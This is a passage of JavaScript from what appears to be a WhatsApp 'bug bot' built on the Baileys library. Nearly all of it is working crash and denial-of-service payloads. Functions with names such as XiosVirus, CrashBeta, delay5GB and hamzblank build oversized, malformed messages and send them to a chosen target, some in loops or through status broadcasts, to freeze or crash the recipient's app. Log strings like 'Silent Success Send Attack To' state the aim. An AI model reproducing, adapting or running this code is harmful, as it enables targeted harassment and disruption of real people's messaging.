            degreesLongitude: 111.45231,
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 35000,
                  },
                  () =>
                    "628" +
                    Math.floor(Math.random() * 10000000000) +
                    "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 999999,
              isForwarded: true,
            },
          },
        },
      },
    };

    const msg3 = generateWAMessageFromContent(target, message, {});

    let statusid;
    statusid = await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    const messageVxzXinvis = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyNotWhyy👀",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyNotWhyy👀".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: {
              text: "VaxzyNotWhyy👀",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, messageVxzXinvis, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });

    const messageVerloadXCall = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ini vaxzy bego 😩",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "ini vaxzy bego 😩".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: {
              text: `ini vaxzy bego 😩${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, messageVerloadXCall, {
      participant: { jid: target },
    });
  } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}
async function invisibleSpam(sock, target, count = 30) {
  const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];

  for (const x of type) {
    const enty = Math.floor(Math.random() * type.length);
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "\u0003",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: x,
                paramsJson: "\x10".repeat(1000000),
                version: 3
              },
              entryPointConversionSource: type[enty]
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    );

    await new Promise(resolve => setTimeout(resolve, 1000));
  }
}
async function delay5GB(sock, target, mention, count = 60) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: ".k",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "\n",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "zep" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
async function IvsNull(sock, X, count = 40) {
  const cards = [];
  const media = await prepareWAMessageMedia({
    image: { url: "https://files.catbox.moe/sgul1z.jpg" }
  }, {
    upload: sock.waUploadToServer
  })
  const header = {
    imageMessage: media.imageMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "F1X-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "assalammualaikum izin push kontak sebut nama" + "ꦽ".repeat(1470),
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "🩸⃟༑⌁⃰𝐙𝐞‌𝐫𝐨 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };
  for (let r = 0; r < 30; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(15000)
      }
    });
  }
  const msg = generateWAMessageFromContent(
    X,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𝗦‌𝗮‌𝘀‌𝘂‌𝗸‌𝗲 𝗖‌𝗿‌𝗮𝘀𝗵 𝗕‌𝘆 𝗔‌𝘀‌𝗲𝗽" + "ꦽ".repeat(1470)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Fx1" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "🩸⃟༑⌁⃰𝐙𝐞‌𝐫𝐨 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://GetsuZo.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(X, msg.message, {
    participant: { jid: X },
    messageId: msg.key.id
  });
}
async function CosmoPrivUiXFC(sock, target, count = 60) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target
            },
          },
          body: {
            text: "Idiot Strikes 💥" + "ꦽ".repeat(45000),
          },
          nativeFlowMessage: {
            buttons: [{
              name: "single_select",
              buttonParamsJson: venomModsData + "\u0000",
            },
            {
              name: "call_permission_request",
              buttonParamsJson: venomModsData + "FCKINHDS",
            },
            {
              name: "mpm",
              buttonParamsJson: venomModsData + "",
            },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, message, {
    participant: {
      jid: target
    },
  });
  console.log(chalk.red("Maklo Ui Fc"));
}
async function CrashBeta(sock, target, count = 50) {
  const teks = "см┤".repeat(250000);
  const spamMention = Array.from({ length: 1950 }, (_, i) => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);

  const payload = {
    text: teks,
    contextInfo: {
      mentionedJid: spamMention
    }
  };

  await sock.sendMessage(target, payload, { quoted: null });
}

// END BUG KAPOTID

// FUNCTION BUG JUSTIN
async function XiosVirus(sock, X) {
  try {
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "𝗫𝗦 𝗠𝗢𝗗𝗗𝗘𝗥𝗦" + "𖣂".repeat(15000),
      address: "🩸⃟༑⌁⃰𝐓𝐡͢𝐚𝐧 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧ཀ͜͡🦠" + "𖣂".repeat(5000),
      url: `https://api-than-xs.${"𖣂".repeat(25000)}.com`,
    }
    let msg = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});
    let extendMsg = {
      extendedTextMessage: {
        text: "JustinXSatanic",
        matchedText: "https://t.me/thanror",
        description: "ios turbo - 1080".repeat(15000),
        title: "—!s thann xs".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msg2 = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          extendedTextMessage: extendMsg.extendedTextMessage
        }
      }
    }, {});
    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
    await sock.relayMessage('status@broadcast', msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
};

async function SqLException(sock, target) {
  console.log("terkirim")
  const payload = {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true,
        jpegThumbnail: cihuy
      },
      contextInfo: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        conversionSource: "porn",
        conversionData: crypto.randomBytes(16),
        conversionDelaySeconds: 9999,
        forwardingScore: 999999,
        isForwarded: true,
        quotedAd: {
          advertiserName: "StX Revolution 👾",
          mediaType: "IMAGE",
          jpegThumbnail: cihuy,
          caption: "SOLO EXPOSED"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        },
        expiration: -99999,
        ephemeralSettingTimestamp: Date.now(),
        ephemeralSharedSecret: crypto.randomBytes(16),
        entryPointConversionSource: "WhatsaApp",
        entryPointConversionApp: "WhatsApp",
        actionLink: {
          url: "t.me/tamainfinity",
          buttonTitle: "action_button"
        },
        disappearingMode: {
          initiator: 1,
          trigger: 2,
          initiatorDeviceJid: target,
          initiatedByMe: true
        },
        groupSubject: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        parentGroupJid: "120363370626418572@g.us",
        trustBannerType: "X",
        trustBannerAction: 99999,
        isSampled: true,
        externalAdReply: {
          title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
          mediaType: 2,
          renderLargerThumbnail: false,
          showAdAttribution: false,
          containsAutoReply: false,
          body: "© T-Яyuichi",
          thumbnail: cihuy,
          sourceUrl: "t.me/tamainfinity",
          sourceId: "9T7A4M1A",
          ctwaClid: "ctwaClid",
          ref: "ref",
          clickToWhatsappCall: true,
          ctaPayload: "ctaPayload",
          disableNudge: true,
          originalImageUrl: null
        },
        featureEligibilities: {
          cannotBeReactedTo: true,
          cannotBeRanked: true,
          canRequestFeedback: true
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
          contentType: 3,
          accessibilityText: "FnX Exposed"
        },
        statusAttributionType: 2,
        utm: {
          utmSource: "XSource",
          utmCampaign: "XCampaign"
        }
      },
      body: {
        text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: `{}`
          }
        ]
      }
    }
  };

  const message = await (async () => {
    try {
      return generateWAMessageFromContent(
        target,
        payload,
        {}
      );
    } catch (e) {
      console.error("Error generating message payload:", e);
    }
  })();

  if (message) {
    await sock.relayMessage(
      target,
      message.message,
      {
        messageId: message.key.id,
        participant: {
          jid: target
        }
      }
    );
  }
}

async function nasgor(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true,
        jpegThumbnail: cihuy,
        title: "D | 7eppeli-Exploration"
      },
      contextInfo: {
        participant: "13135550002@s.whatsapp.net",
        remoteJid: "status@broadcast",
        conversionSource: "Wa.me/stickerpack/d7y",
        conversionData: Math.random(),
        conversionDelaySeconds: 250208,
        isForwarded: true,
        forwardingScore: 250208,
        forwardNewsletterMessageInfo: {
          newsletterName: "D | 7eppeli-Exploration",
          newsletterJid: "1@newsletter",
          serverMessageId: 1
        },
        quotedAd: {
          caption: "D | 7eppeli-Exploration",
          advertiserName: "D | 7eppeli-Exploration",
          mediaType: "VIDEO"
        },
        placeKeyHolder: {
          fromMe: false,
          remoteJid: "0@s.whatsapp.net",
          id: "YUKJAL1234"
        },
        expiration: -250208,
        ephemeralSettingTimestamp: 99999,
        ephemeralSharedSecret: 999,
        entryPointConversionSource: "Whatsapp.com",
        entryPointConversionApp: "Whatsapp.com",
        actionLink: {
          url: "Wa.me/stickerpack/d7y",
          buttonTitle: "D | 7eppeli-Exploration"
        }
      },
      nativeFlowMessage: {
        messageParamaJson: "{".repeat(9000),
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":false}"
          }
        ],
        messageParamsJson: "}".repeat(9000)
      }
    }
  }, { participant: { jid: target } })
}

async function iosOver(sock, durationHours, XS) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`Success! Total terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 200) {
        await Promise.all([
          XiosVirus(sock, XS),
          TrashLocIOS(sock, XS)
        ]);
        console.log(chalk.yellow(`${count + 1}/200 🍷`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(chalk.green(`Success Send Bug to ${XS} (${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`JustinXSatanic — 2025`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`${maxBatches}`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}
// ================= END BUG JUSTIN ===================== \\
// FUNCTION BLANK
async function N3xithBlank(sock, X) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
      caption: "𝐍𝟑𝐱̈𝒊𝐭𝐡 Cʟᴀsˢˢˢ #🇧🇳 ( 𝟑𝟑𝟑 )" + "꧀".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  try {
    await sock.relayMessage(X, msg, {
      participant: { jid: X },
      messageId: sock.generateMessageTag?.() || generateMessageID()
    });
  } catch (error) {
    console.error(`❌ Gagal mengirim bug ke ${X}:`, error.message);
  }
}

async function hamzdelayhard(sock, count, target) {
  for (let i = 0; i < count; i++) {
    console.log(chalk.red(`Silent Success Send Attack To ${target}`))
    var xts = { url: "https://img1.pixhost.to/images/10157/660814845_alwayszakzz.jpg" }
    await sock.relayMessage(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ", // FuncBug
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1000000),
                version: 3,
              },
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 2000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 9000000) +
                    "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 555,
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
                body: "https://rule34.com",
                previewType: "VIDEO",
                mediaType: "VIDEO",
                thumbnail: xts,
                mediaType: 2,
                thumbnailUrl: xts.url,
                sourceUrl: "t.me/DimzNotDev",
                mediaUrl: "t.me/DimzNotDev",
                sourceType: " x ",
                sourceId: " x ",
                containsAutoReply: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              quotedAd: {
                advertiserName: " X ",
                mediaType: "IMAGE",
                jpegThumbnail: xts,
                mediaType: 1,
                jpegThumbnail: Buffer.alloc(0),
                caption: " X ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              isSampled: false,
              utm: {
                utmSource: " X ",
                utmCampaign: " X ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " X ",
                contentType: "UPDATE",
                accessibilityText: " X ",
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
      }
    );
  }
}

async function hamzblank(sock, count, target) {
  for (let i = 0; i < count; i++) {
    console.log(chalk.red(`Silent Success Send Attack To ${target}`))
    const DevaOmagah = "ꦽ".repeat(500000);
    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              hasMediaAttachment: false
            },
            body: {
              text: "\n".repeat(10) + DevaOmagah
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(2000) + "[".repeat(1234),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: DevaOmagah
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true })
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: DevaOmagah
                }
              ]
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      messageId: generateMessageID(),
      participant: { jid: target }
    });
  }
}

async function protocolbug19(sock, target) {
  let HtsAnjir = await prepareWAMessageMedia({
    video: Buffer.alloc(50000),
    mimetype: "video/mp4",
    fileSha256: "sI35p92ZSwo+OMIPRJt2UlKUFmwgwizYOheNU7LtO5k=",
    fileEncSha256: "/6FWCFe34cg/QH4RpN3AOLTOS8wLJ9JI6zQoyJZgg5Y=",
    fileLength: 3133846,
    seconds: 26
  }, {
    upload: sock.waUploadToServer
  });
  const BututAhAh = {
    buttons: [
      {
        name: "galaxy_message",
        buttonParamsJson: `{\"flow_cta\":\"${"\u0000".repeat(200000)}\"}`,
        version: 3
      }
    ]
  };
  const PouCrousel = () => ({
    header: {
      ...HtsAnjir,
      hasMediaAttachment: true
    },
    nativeFlowMessage: {
      ...BututAhAh,
    }
  });
  let PouMsg = await generateWAMessageFromContent(target,
    proto.Message.fromObject({
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            body: { text: "ASSALAMUALAIKUM" },
            carouselMessage: {
              cards: [
                PouCrousel(),
                PouCrousel(),
                PouCrousel(),
                PouCrousel(),
                PouCrousel()
              ]
            },
            contextInfo: { mentionedJid: [target] }
          }
        }
      }
    }),
    { userJid: target, quoted: null }
  );
  await sock.relayMessage(target, PouMsg.message, {
    messageId: PouMsg.key.id,
    participant: { jid: target }
  });
}

// FUNCTION DELAY
async function protocolbug18(sock, target, mention) {
  for (let p = 0; p < 5; p++) {

    const PouMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 3,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveResponseMessage: {
            body: {
              text: "\u0000".repeat(300),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                header: "\u0000".repeat(10000),
                body: "\u0000".repeat(10000),
                flow_action: "navigate",
                flow_action_payload: { screen: "FORM_SCREEN" },
                flow_cta: "\u0000".repeat(900000),
                flow_id: "1169834181134583",
                flow_message_version: "3",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
              })
            }
          }
        }
      }
    });

    await sock.relayMessage("status@broadcast", PouMsg.message, {
      messageId: PouMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: PouMsg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "#PouMods Official" },
                content: undefined
              }
            ]
          }
        }
      }, {});
    }

  }
}

async function BandangV1(sock, target) {
  const PouMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\u0000".repeat(200),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: JSON.stringify({ status: true }),
            version: 3
          }
        },
        contextInfo: {
          mentionedJid: Array.from(
            { length: 30000 },
            () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          remoteJid: "status@broadcast",
          forwardingScore: 999,
          isForwarded: true
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", PouMsg.message, {
    messageId: PouMsg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: undefined
            }
          ]
        }
      ]
    }
    ]
  }
  );
}


async function bandangV2(sock, target) {
  const PouMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\u0000".repeat(200),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "menu_options",
            paramsJson: "{\"display_text\":\" PouMods - Offcial\",\"id\":\".Grifith\",\"description\":\"gatau bet mut.\"}",
            version: 3
          }
        },
        contextInfo: {
          mentionedJid: Array.from(
            { length: 30000 },
            () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          remoteJid: "status@broadcast",
          forwardingScore: 999,
          isForwarded: true
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", PouMsg.message, {
    messageId: PouMsg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: undefined
            }
          ]
        }
      ]
    }
    ]
  }
  );
}

async function delayloww(sock, target) {
  const PouMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\u0000".repeat(200),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: JSON.stringify({ status: true }),
            version: 3
          }
        },
        contextInfo: {
          mentionedJid: Array.from(
            { length: 30000 },
            () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          remoteJid: "status@broadcast",
          forwardingScore: 999,
          isForwarded: true
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", PouMsg.message, {
    messageId: PouMsg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: undefined
            }
          ]
        }
      ]
    }
    ]
  }
  );
}

async function XvrZenDly(sock, target) {
  try {
    let msg = generateWAMessageFromContent(target, {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
          },
          body: {
            text: "\u0000".repeat(1500),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }, { userJid: target });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

  } catch (err) {
    console.error(chalk.red.bold("func Error jir:"), err);
  }
}
//FUNCTION UI ANDROID
async function PouButtonUi(sock, target) {
  for (let i = 0; i < 5; i++) {
    const PouMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
              hasMediaAttachment: false
            },
            body: {
              text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥" + "ꦽ".repeat(3000) + "ꦾ".repeat(3000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(5000),
              limited_time_offer: {
                text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
                url: "t.me/PouSkibudi",
                copy_code: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
                expiration_time: Date.now() * 999
              },
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000)
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
                    flow_message_version: "3"
                  })
                }
              ]
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 1000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
              isForwarded: true,
